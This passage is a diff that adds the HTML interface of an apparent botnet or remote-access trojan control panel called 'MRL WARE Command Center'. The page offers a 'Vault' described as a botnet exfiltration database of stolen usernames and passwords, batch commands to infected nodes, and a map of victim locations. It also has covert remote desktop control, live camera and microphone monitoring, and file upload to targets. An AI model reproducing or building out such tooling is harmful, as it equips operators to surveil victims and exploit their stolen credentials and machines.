@@ -1,0 +1,946 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MRL WARE | Command Center</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/static/style.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+</head>
+<body oncontextmenu="return false;">
+<aside class="sidebar">
+    <a href="/" class="brand">
+        <div class="brand-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><title>Icon</title><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg></div>
+        <div><div class="brand-name">MRL WARE</div><div class="brand-sub">Command Center</div></div>
+    </a>
+    <nav style="flex-grow:1;display:flex;flex-direction:column">
+        <div class="nav-section-label">Operations</div>
+        <a class="nav-link active" onclick="showView('overview')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><title>Icon</title><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/></svg>Overview</a>
+        <a class="nav-link" onclick="showView('vault')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><title>Icon</title><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>The Vault</a>
+        <a class="nav-link" onclick="showView('vault')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><title>Icon</title><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>The Vault</a>
+        <a class="nav-link" onclick="showView('logs')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><title>Icon</title><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>Event Logs</a>
+        <a class="nav-link" onclick="showView('map')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><title>Icon</title><circle cx="12" cy="12" r="10"/><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"/><path d="M2 12h20"/></svg>Node Map</a>
+        <a class="nav-link" id="adminNavLink" style="display:none;position:relative" onclick="showView('admin')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><title>Icon</title><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Admin Settings<span id="adminNavBadge" style="display:none;position:absolute;top:4px;right:8px;background:var(--red);color:#fff;font-size:.55rem;font-weight:800;width:16px;height:16px;border-radius:50%;align-items:center;justify-content:center;line-height:1">0</span></a>
+    </nav>
+</aside>
+
+<main class="main-area">
+    <div class="top-bar">
+        <div style="flex: 1; margin-right: 20px;">
+            <div class="cmd-bar-wrapper">
+                <span class="cmd-bar-prompt">λ</span>
+                <input type="text" id="globalCmdBar" placeholder="Execute command (e.g. 'kill 1234', 'ls C:\', 'help')..." onkeydown="if(event.key==='Enter') execGlobalCmd()">
+                <div class="cmd-bar-shortcut">ENTER</div>
+            </div>
+        </div>
+        <div class="top-bar-actions">
+            <div class="conn-indicator">
+                <div id="headerConnDot" class="conn-dot offline"></div>
+                <span id="headerConnStatus" style="font-size:.8rem;font-weight:600;color:var(--text-2)">Connecting...</span>
+            </div>
+            <div id="persistBadge" style="display:none;align-items:center;margin-right:12px;padding:2px 8px;background:rgba(255,179,0,0.1);border:1px solid var(--amber);border-radius:4px;gap:6px">
+                <div style="width:6px;height:6px;background:var(--amber);border-radius:50%;box-shadow:0 0 8px var(--amber)"></div>
+                <span id="persistBadgeText" style="font-size:0.6rem;font-weight:800;color:var(--amber);text-transform:uppercase;letter-spacing:0.05em">Volatile Access</span>
+            </div>
+            <!-- ... -->
+            <div id="rtcBadge" style="display:none;align-items:center;margin-right:12px;padding:2px 8px;background:rgba(16,185,129,0.1);border:1px solid var(--teal);border-radius:4px;gap:6px">
+                <div style="width:6px;height:6px;background:var(--teal);border-radius:50%;box-shadow:0 0 8px var(--teal)"></div>
+                <span style="font-size:0.65rem;font-weight:800;color:var(--teal);text-transform:uppercase;letter-spacing:0.05em">P2P Active</span>
+            </div>
+            <div style="position:relative;display:flex;flex-direction:column;align-items:center;margin-right:8px;">
+                <div class="profile-circle" id="userProfile" title="Profile" onclick="document.getElementById('logoutDropdown').style.display = document.getElementById('logoutDropdown').style.display === 'block' ? 'none' : 'block'" style="cursor:pointer">
+                    <img id="userAvatarImg" src="" alt=""><span id="userInitials">?</span>
+                </div>
+                <span id="userRoleUnder" style="font-size:0.6rem;font-weight:700;color:var(--text-3);text-transform:uppercase;margin-top:4px">User</span>
+                <!-- Logout Dropdown -->
+                <div id="logoutDropdown" style="display:none;position:absolute;top:45px;right:0;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:6px;box-shadow:0 10px 30px rgba(0,0,0,0.5);z-index:100;min-width:100px;">
+                    <button type="button" class="btn-ghost" style="width:100%;text-align:left;color:var(--red);padding:6px 10px;font-size:0.7rem;border-radius:4px" onclick="window.location.href='/auth/logout'">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;height:14px;display:inline-block;vertical-align:middle;margin-right:6px"><title>Icon</title><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
+                        Log Out
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ── OVERVIEW ── -->
+    <div id="view-overview" class="fade-in">
+        <!-- Dashboard Intelligence Header -->
+        <div style="display:grid;grid-template-columns:1fr 1fr 2fr;gap:1.125rem;margin-bottom:1.5rem">
+            <!-- Stat Cards -->
+            <div class="stat-card">
+                <div class="stat-label">Active Nodes</div>
+                <div class="stat-value" id="statActiveNodes">0</div>
+                <div class="badge badge-teal">Live Uplink</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Server Load</div>
+                <div class="stat-value" id="statServerLoad">—</div>
+                <div class="badge badge-blue">Optimized</div>
+            </div>
+            
+            <!-- Live Graphs -->
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.125rem;">
+                <div class="graph-card">
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:.5rem">
+                        <div style="font-size:.72rem;font-weight:700;color:var(--text-2);letter-spacing:.04em">CONNECTIONS / MIN</div>
+                        <span id="graphConBadge" style="font-size:.72rem;font-weight:700;color:var(--violet)">0/m</span>
+                    </div>
+                    <canvas class="graph-canvas" id="graphConn"></canvas>
+                </div>
+                <div class="graph-card">
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:.5rem">
+                        <div style="font-size:.72rem;font-weight:700;color:var(--text-2);letter-spacing:.04em">SERVER LOAD</div>
+                        <span id="graphLoadVal" style="font-size:.72rem;font-weight:700;color:var(--accent)">—</span>
+                    </div>
+                    <canvas class="graph-canvas" id="graphLoad"></canvas>
+                </div>
+            </div>
+        </div>
+
+        <!-- Node Grid -->
+        <div class="card" style="background:transparent;border:none;padding:0;box-shadow:none">
+            <div class="card-header" style="padding:0 0.5rem">
+                <div><div class="card-title">Connected Nodes</div><div class="card-subtitle" style="margin-top:4px">Click a node to open remote session</div></div>
+                <div style="display:flex;align-items:center;gap:.5rem">
+                    <!-- Node search -->
+                    <input type="text" id="nodeSearchInput"
+                        placeholder="🔍 Filter nodes..."
+                        oninput="filterNodes(this.value)"
+                        style="background:rgba(255,255,255,.06);border:1px solid var(--border);border-radius:8px;padding:.3rem .7rem;font-size:.7rem;color:var(--text-1);outline:none;font-family:inherit;width:140px;transition:border-color .2s"
+                        onfocus="this.style.borderColor='var(--accent)'" onblur="this.style.borderColor='var(--border)'"
+                    >
+                    <!-- Batch command -->
+                    <button type="button" class="btn-ghost" style="font-size:.65rem;padding:.3rem .7rem;border-color:rgba(251,191,36,.3);color:var(--amber)" onclick="_promptBatchCmd()" title="Ctrl+K">
+                        📡 Batch
+                    </button>
+                    <span class="badge badge-teal" id="liveCount">0 Online</span>
+                </div>
+            </div>
+            <div id="nodeGrid" class="node-grid">
+                <div style="grid-column:1/-1;text-align:center;padding:4rem;color:var(--text-3);font-size:.88rem">Awaiting connections...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ── NODE MAP ── -->
+    <div id="view-map" style="display:none;height:calc(100vh - 175px)" class="fade-in">
+        <div class="card" style="height:100%;display:flex;flex-direction:column;padding:0">
+            <div style="padding:1.125rem 1.375rem;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center">
+                <div><div class="card-title">World Intelligence Map</div><div class="card-subtitle" style="margin-top:3px">Real-time geospatial node tracking</div></div>
+                <div style="display:flex;align-items:center;gap:12px">
+                    <div style="font-size:0.6rem;font-weight:800;color:var(--accent);letter-spacing:0.1em;animation:pulse-dot 1s infinite">SCANNING SATELLITE UPLINK...</div>
+                    <span class="badge badge-violet">Live GeoIP</span>
+                </div>
+            </div>
+            <div id="nodeMapWrap" style="flex-grow:1;position:relative;width:100%;overflow:hidden;">
+                <div class="scanline"></div>
+                <div id="map" style="width:100%;height:100%;z-index:1;"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ── THE VAULT ── -->
+    <div id="view-vault" style="display:none;height:calc(100vh - 175px)" class="fade-in">
+        <div class="card" style="height:100%;display:flex;flex-direction:column;padding:0">
+            <div style="padding:1.125rem 1.375rem;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center">
+                <div>
+                    <div class="card-title" style="color:var(--amber)">The Vault</div>
+                    <div class="card-subtitle" style="margin-top:3px">Centralized Botnet Exfiltration Database</div>
+                </div>
+                <div style="display:flex;gap:8px">
+                    <button type="button" class="btn-ghost" style="font-size:.78rem;padding:.4rem .875rem" onclick="fetchVaultData()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;display:inline-block;vertical-align:middle;margin-right:4px"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>Refresh</button>
+                    <button type="button" class="btn-ghost" style="font-size:.78rem;padding:.4rem .875rem;color:var(--teal);border-color:var(--teal)" onclick="exportVaultData()">📥 Export JSON</button>
+                </div>
+            </div>
+            
+            <div style="padding: 1rem 1.375rem; border-bottom:1px solid var(--border)">
+                <input type="text" id="globalVaultSearch" placeholder="Search across all botnet targets, sites, usernames, or passwords..." oninput="filterGlobalVault(this.value)" style="width:100%;background:rgba(0,0,0,0.4);border:1px solid var(--border);border-radius:10px;padding:.6rem 1rem;font-size:.8rem;color:var(--text-1);outline:none;">
+            </div>
+
+            <div style="flex-grow:1;overflow-y:auto;background:rgba(0,0,0,.2);">
+                <table style="width:100%;border-collapse:collapse;font-size:.75rem">
+                    <thead style="position:sticky;top:0;background:var(--surface);z-index:10;box-shadow:0 4px 10px rgba(0,0,0,0.5)">
+                        <tr style="color:var(--text-3);text-transform:uppercase;font-size:.65rem">
+                            <th style="padding:1rem;text-align:left;border-bottom:1px solid var(--border)">Target Node</th>
+                            <th style="padding:1rem;text-align:left;border-bottom:1px solid var(--border)">Type</th>
+                            <th style="padding:1rem;text-align:left;border-bottom:1px solid var(--border)">Platform / Site</th>
+                            <th style="padding:1rem;text-align:left;border-bottom:1px solid var(--border)">Identity / Data</th>
+                            <th style="padding:1rem;text-align:left;border-bottom:1px solid var(--border)">Time Extracted</th>
+                        </tr>
+                    </thead>
+                    <tbody id="globalVaultBody">
+                        <tr><td colspan="5" style="text-align:center;padding:4rem;color:var(--text-3)">Loading Vault Intelligence...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- ── LOGS ── -->
+    <div id="view-logs" style="display:none;height:calc(100vh - 175px)" class="fade-in">
+        <div class="card" style="height:100%;display:flex;flex-direction:column;padding:0">
+            <div style="padding:1.125rem 1.375rem;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center">
+                <div><div class="card-title">System Event Logs</div><div class="card-subtitle" style="margin-top:3px">Live forensic telemetry</div></div>
+                <button type="button" class="btn-ghost" style="font-size:.78rem;padding:.4rem .875rem" onclick="$('eventLogStream').innerHTML=''">Clear</button>
+            </div>
+            <div id="eventLogStream" style="flex-grow:1;overflow-y:auto;padding:1.375rem"></div>
+        </div>
+    </div>
+
+    <!-- ── ADMIN ── -->
+    <div id="view-admin" style="display:none" class="fade-in">
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.25rem;margin-bottom:1.25rem">
+            <div class="card">
+                <div class="card-header">
+                    <div><div class="card-title">User Management</div><div class="card-subtitle" style="margin-top:3px">Ban, promote, and manage operators</div></div>
+                    <button type="button" class="btn-primary" style="font-size:.78rem;padding:.45rem .875rem" onclick="adminLoadUsers()">↻ Refresh</button>
+                </div>
+                <div id="adminUserList"><div style="color:var(--text-3);font-size:.84rem;padding:2rem;text-align:center">Loading...</div></div>
+            </div>
+            <div class="card">
+                <div class="card-header">
+                    <div><div class="card-title">Node Access Control</div><div class="card-subtitle" style="margin-top:3px">Restrict who can view each connection</div></div>
+                </div>
+                <div id="adminNodeAccess"><div style="color:var(--text-3);font-size:.84rem;padding:2rem;text-align:center">Select a node to configure access</div></div>
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-header">
+                <div><div class="card-title">Chat Moderation</div><div class="card-subtitle" style="margin-top:3px">View and delete messages</div></div>
+                <button type="button" class="btn-primary" style="font-size:.78rem;padding:.45rem .875rem" onclick="adminLoadChat()">↻ Load</button>
+            </div>
+            <div id="adminChatList" style="max-height:380px;overflow-y:auto"></div>
+        </div>
+    </div>
+</main>
+
+<!-- ── CHAT FAB ── -->
+<button type="button" class="chat-fab" onclick="toggleChat()" title="Secure Comms">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><title>Icon</title><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+    <div id="chatUnread" style="position:absolute;top:-4px;right:-4px;width:18px;height:18px;background:var(--red);border-radius:50%;font-size:.6rem;font-weight:700;color:#fff;display:none;align-items:center;justify-content:center">0</div>
+</button>
+
+<!-- ── CHAT DRAWER ── -->
+<div class="chat-drawer" id="chatDrawer">
+    <div style="padding:1.125rem 1.375rem;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center">
+        <div><div class="card-title">Secure Comms</div><div class="card-subtitle" style="margin-top:3px">End-to-end encrypted</div></div>
+        <button type="button" class="btn-icon" onclick="toggleChat()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><title>Icon</title><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+    </div>
+    <div id="chatStream" style="flex-grow:1;overflow-y:auto;padding:1.125rem;display:flex;flex-direction:column;gap:.625rem"></div>
+    <div class="chat-input-area">
+        <div id="typingIndicator" class="typing-indicator-wrap">
+            <div id="typingAvatar" style="width:20px;height:20px;border-radius:50%;background:var(--accent-dim);display:flex;align-items:center;justify-content:center;font-size:.58rem;font-weight:700;color:var(--accent);overflow:hidden"></div>
+            <span id="typingName" style="font-size:.7rem;font-weight:600;color:var(--text-3)">Someone</span>
+            <div class="typing-dots"><div class="typing-dot"></div><div class="typing-dot"></div><div class="typing-dot"></div></div>
+        </div>
+        <input type="text" id="chatInput" class="chat-input" placeholder="Secure message..." oninput="handleTyping()" onkeydown="if(event.key==='Enter')sendChat()">
+        <button type="button" class="btn-primary" style="padding:.6rem .875rem;flex-shrink:0" onclick="sendChat()"><svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2.5"><title>Icon</title><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg></button>
+    </div>
+</div>
+
+<!-- ── REMOTE MODAL ── -->
+<div id="remoteModal" style="display:none;position:fixed;inset:0;z-index:20000">
+    <div class="remote-wrapper">
+        <div class="remote-screen-area" id="remoteScreenArea"
+             tabindex="0"
+             style="outline:none;user-select:none"
+             ondragover="event.preventDefault(); $('dropZone').style.display='flex';"
+             ondragleave="$('dropZone').style.display='none';"
+             ondrop="event.preventDefault(); $('dropZone').style.display='none'; handleDrop(event);">
+            
+            <!-- Dedicated Input Layer -->
+            <div id="remoteInputLayer" 
+                 style="position:absolute;inset:0;z-index:9000;cursor:crosshair"
+                 onmousemove="sendMouseEvent(event,'mousemove')"
+                 onmousedown="sendMouseEvent(event,'mousedown')"
+                 onmouseup="sendMouseEvent(event,'mouseup')"
+                 oncontextmenu="event.preventDefault();"
+                 onwheel="sendWheelEvent(event)"></div>
+
+            <div class="scanline"></div>
+            <div class="scanning-line"></div>
+            <div class="screen-corner corner-tl"></div>
+            <div class="screen-corner corner-tr"></div>
+            <div class="screen-corner corner-bl"></div>
+            <div class="screen-corner corner-br"></div>
+            <!-- Canvas-based zero-copy renderer -->
+            <canvas id="desktopView"
+                 tabindex="0"
+                 style="position:absolute;inset:0;width:100%;height:100%;object-fit:contain;display:none;z-index:100;touch-action:none;outline:none;pointer-events:none"
+                 oncontextmenu="return false;"></canvas>
+            <div id="camContainer" style="position:absolute;bottom:80px;right:20px;width:280px;display:none;z-index:9999;background:rgba(15,20,25,0.85);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.15);border-radius:14px;box-shadow:0 20px 50px rgba(0,0,0,0.6);overflow:hidden;user-select:none;">
+                <div id="camHeader" style="padding:8px 12px;background:rgba(255,255,255,0.05);display:flex;align-items:center;justify-content:space-between;cursor:move;border-bottom:1px solid rgba(255,255,255,0.08);">
+                    <div style="font-size:11px;font-weight:700;color:var(--text-2);text-transform:uppercase;letter-spacing:1px;display:flex;align-items:center;gap:6px;">
+                        <span style="width:6px;height:6px;background:#f87171;border-radius:50%;display:inline-block;box-shadow:0 0 8px #f87171;"></span>
+                        Live Camera
+                    </div>
+                    <div onclick="switchCamera(-1)" style="cursor:pointer;opacity:0.6;transition:0.2s;">
+                        <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5"><title>Icon</title><path d="M18 6L6 18M6 6l12 12"/></svg>
+                    </div>
+                </div>
+                <div style="position:relative;width:100%;">
+                    <!-- Camera also uses canvas for zero-copy rendering -->
+                    <canvas id="camView" style="width:100%;height:auto;display:block;pointer-events:none;"></canvas>
+                </div>
+            </div>
+            <div id="dropZone" style="display:none;position:absolute;inset:0;z-index:10010;background:rgba(0,240,255,0.1);backdrop-filter:blur(10px);border:4px dashed var(--accent);border-radius:20px;flex-direction:column;align-items:center;justify-content:center;pointer-events:none">
+                <div style="font-size:4rem;margin-bottom:1rem">📤</div>
+                <div style="font-size:1.5rem;font-weight:900;color:var(--text-1);text-transform:uppercase;letter-spacing:.2em">Upload to Target</div>
+                <div style="font-size:0.8rem;color:var(--accent);margin-top:.5rem">Drop files to transmit into current directory</div>
+            </div>
+            <div id="noStreamMsg" style="position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;color:var(--text-3);text-align:center;z-index:0;pointer-events:none;background:#000">
+                <canvas id="matrixCanvas" style="position:absolute;inset:0;width:100%;height:100%;opacity:.15"></canvas>
+                <div style="position:relative;z-index:1">
+                    <div style="font-size:3.5rem;margin-bottom:.5rem;filter:drop-shadow(0 0 10px var(--accent-glow))">📡</div>
+                    <div style="font-size:.9rem;font-weight:900;color:var(--accent);text-transform:uppercase;letter-spacing:.3em;text-shadow:0 0 15px var(--accent-glow)">Awaiting Neural Link</div>
+                    <div style="font-size:.6rem;color:var(--text-3);margin-top:.8rem;text-transform:uppercase;letter-spacing:.1em">Encrypted Tunnel Handshake in Progress...</div>
+                </div>
+            </div>
+            <!-- Slide-down pull tab: visible only when header is collapsed -->
+            <div id="remoteHeaderTab" onclick="togglePanelCollapse()" style="display:none;position:absolute;top:0;left:50%;transform:translateX(-50%);z-index:10010;background:rgba(20,22,30,0.97);border:1px solid rgba(255,255,255,0.12);border-top:none;border-radius:0 0 12px 12px;padding:.3rem 1.2rem;cursor:pointer;font-size:.75rem;font-weight:700;color:var(--text-2);align-items:center;gap:.4rem;box-shadow:0 4px 20px rgba(0,0,0,.5)">
+                &#x25BC; PANEL
+            </div>
+            <div id="remoteHeader" style="position:absolute;top:0;left:0;right:0;z-index:10000;transition:transform .3s cubic-bezier(.4,0,.2,1)">
+                <div class="remote-toolbar">
+                    <!-- ... (existing toolbar content) -->
+                    <!-- Group 1: Node Info -->
+                    <div style="display:flex;align-items:center;">
+                        <div class="remote-toolbar-item" style="color:var(--accent);font-weight:700;font-family:'JetBrains Mono',monospace;letter-spacing:1px;" id="remoteNodeLabel">—</div>
+                    </div>
+                    <div class="remote-toolbar-divider"></div>
+
+                    <!-- Group 2: Streaming Controls -->
+                    <div style="display:flex;align-items:center;gap:4px;">
+                        <div class="remote-toolbar-item" id="monitorSelector" style="display:none">
+                            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2"><title>Icon</title><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+                            <select id="monSelect" onchange="switchMonitor(this.value)" style="background:transparent;color:var(--text-1);border:none;outline:none;font-size:.7rem;font-weight:600;cursor:pointer;appearance:none;padding-right:4px">
+                                <option value="0">Mon 1</option>
+                            </select>
+                        </div>
+                        <div class="remote-toolbar-item" id="cameraSelector" style="display:none;gap:4px;padding:.3rem .4rem">
+                            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2"><title>Icon</title><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
+                            <select id="camSelect" onchange="switchCamera(this.value)" style="background:rgba(0,240,255,0.08);color:var(--accent);border:1px solid rgba(0,240,255,0.25);border-radius:8px;outline:none;font-size:.66rem;font-weight:700;font-family:inherit;cursor:pointer;padding:.15rem .4rem">
+                                <option value="-1">Cam OFF</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="remote-toolbar-divider"></div>
+
+                    <!-- Group 3: HID / Interaction -->
+                    <div style="display:flex;align-items:center;gap:4px;">
+                        <div class="remote-toolbar-item" id="btnMode" onclick="toggleHidMode()" title="Switch between View and Control mode">
+                            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2"><title>Icon</title><circle cx="12" cy="12" r="3"/><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/></svg>
+                            <span>Watch Only</span>
+                        </div>
+                        <div class="remote-toolbar-item" onclick="toggleFullscreen()" title="Fullscreen mode">
+                            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2"><title>Icon</title><polyline points="15 3 21 3 21 9"/><polyline points="9 21 3 21 3 15"/><line x1="21" y1="3" x2="14" y2="10"/><line x1="3" y1="21" x2="10" y2="14"/></svg>
+                        </div>
+                        <div class="remote-toolbar-item" onclick="popoutRemote()" title="Open in dedicated window">
+                            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2"><title>Icon</title><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+                        </div>
+                    </div>
+                    <div class="remote-toolbar-divider"></div>
+
+                    <!-- Group 4: Audio & Capture -->
+                    <div style="display:flex;align-items:center;gap:6px;background:rgba(255,255,255,.03);border-radius:10px;padding:2px 6px;">
+                        <div class="remote-toolbar-item" id="btnAudioMic" onclick="toggleAudio('mic')" title="Microphone Monitoring" style="padding:.35rem .6rem">
+                            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><title>Icon</title><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/></svg>
+                            <span>Mic</span>
+                        </div>
+                        <div class="remote-toolbar-item" id="btnAudioDesk" onclick="toggleAudio('desktop')" title="Desktop Audio Monitoring" style="padding:.35rem .6rem">
+                            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><title>Icon</title><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14"/><path d="M15.54 8.46a5 5 0 0 1 0 7.07"/></svg>
+                            <span>Sound</span>
+                        </div>
+                    </div>
+                    <div class="remote-toolbar-divider"></div>
+
+                    <!-- Group 5: P2P -->
+                    <div style="display:flex;align-items:center;gap:4px;">
+                        <div class="remote-toolbar-item" id="btnWebRTC" onclick="startWebRTC()" title="Start P2P direct stream (lower latency)">
+                            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2"><title>Icon</title><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+                            <span>WebRTC</span>
+                        </div>
+                    </div>
+                    <div class="remote-toolbar-divider"></div>
+
+                    <!-- Group 6: Tools & Exit -->
+                    <div style="display:flex;align-items:center;gap:4px;">
+                        <div class="remote-toolbar-item" onclick="openFileExplorer(currentTargetId,'C:\\')" title="Graphical File Explorer" style="color:var(--teal)">
+                            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2"><title>Icon</title><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
+                            <span>Files</span>
+                        </div>
+                        <div class="remote-toolbar-item" id="btnRecord" onclick="toggleRecording()" title="Record Session">
+                            <svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><title>Icon</title><circle cx="12" cy="12" r="6"/></svg>
+                            <span>Record</span>
+                        </div>
+                        <div class="remote-toolbar-item active" id="btnPanelToggle" onclick="togglePanel()" title="Open Tools/Control Panel">
+                            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2"><title>Icon</title><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><line x1="15" y1="3" x2="15" y2="21"/></svg>
+                            <span>Panel</span>
+                        </div>
+                        <div class="remote-toolbar-divider"></div>
+                        <div class="remote-toolbar-item" style="color:var(--red);background:rgba(255,42,95,0.08);border-color:rgba(255,42,95,0.2);" onclick="closeRemote()" title="Close session">
+                            <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5"><title>Icon</title><path d="M18 6L6 18M6 6l12 12"/></svg>
+                        </div>
+                    </div>
+                </div>
+            </div><!-- /remoteHeader -->
+
+            <div class="remote-hud">
+                <div class="remote-hud-chip"><span class="hud-label">FPS</span><span class="hud-value" id="remoteFps">0</span></div>
+                <div class="remote-hud-chip"><span class="hud-label">Ping</span><span class="hud-value" id="remoteLatency">—</span></div>
+                <div class="remote-hud-chip" style="font-family:'JetBrains Mono',monospace">
+                    <span class="hud-label">⏱</span>
+                    <span class="hud-value" id="sessionTimer">00:00:00</span>
+                </div>
+                <!-- FPS target selector -->
+                <div class="remote-hud-chip" style="padding:.2rem .5rem;gap:.3rem">
+                    <span class="hud-label">Target</span>
+                    <select id="fpsSelect" onchange="setStreamFps(this.value)" style="background:transparent;border:none;color:var(--text-1);font-size:.62rem;font-weight:700;font-family:'JetBrains Mono',monospace;outline:none;cursor:pointer">
+                        <option value="10">10fps</option>
+                        <option value="20">20fps</option>
+                        <option value="30" selected>30fps</option>
+                        <option value="60">60fps</option>
+                        <option value="120">120fps</option>
+                    </select>
+                </div>
+                <div class="remote-hud-chip" id="remoteModeBadge"><span class="hud-label">Mode</span><span class="hud-value">WATCH ONLY</span></div>
+                <div class="remote-hud-chip" id="audioChip" style="display:none">
+                    <span class="hud-label" id="audioSourceLabel">MIC</span>
+                    <!-- Mini audio meter -->
+                    <div style="display:flex;align-items:flex-end;gap:1px;height:12px;width:24px">
+                        <div id="audBar0" style="width:3px;height:3px;background:var(--teal);border-radius:1px;transition:height .06s"></div>
+                        <div id="audBar1" style="width:3px;height:6px;background:var(--teal);border-radius:1px;transition:height .06s"></div>
+                        <div id="audBar2" style="width:3px;height:9px;background:var(--teal);border-radius:1px;transition:height .06s"></div>
+                        <div id="audBar3" style="width:3px;height:6px;background:var(--teal);border-radius:1px;transition:height .06s"></div>
+                        <div id="audBar4" style="width:3px;height:3px;background:var(--teal);border-radius:1px;transition:height .06s"></div>
+                    </div>
+                </div>
+                <!-- Quality slider -->
+                <div class="remote-hud-chip" style="padding:.2rem .6rem;gap:.4rem">
+                    <span class="hud-label">Q</span>
+                    <input id="qualSlider" type="range" min="20" max="95" value="75" step="5"
+                        style="width:60px;height:3px;accent-color:var(--teal);cursor:pointer"
